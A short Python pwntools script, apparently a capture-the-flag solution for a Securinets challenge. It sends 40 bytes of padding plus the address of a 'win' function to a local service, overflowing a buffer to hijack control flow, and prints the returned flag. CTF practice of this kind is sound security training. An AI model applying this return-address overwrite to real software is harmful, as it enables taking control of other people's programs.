#!/usr/bin/env python3
from pwn import *

context.log_level = "error"
elf = ELF("./main", checksec=False)

io = remote("127.0.0.1", 9005)

payload = b"A" * 40
payload += p64(elf.symbols["win"] + 0x38)

io.sendafter(b"SKIP: ", payload)
io.recvuntil(b"Securinets{")
flag = b"Securinets{" + io.recvuntil(b"}")
print(flag.decode())
io.close()
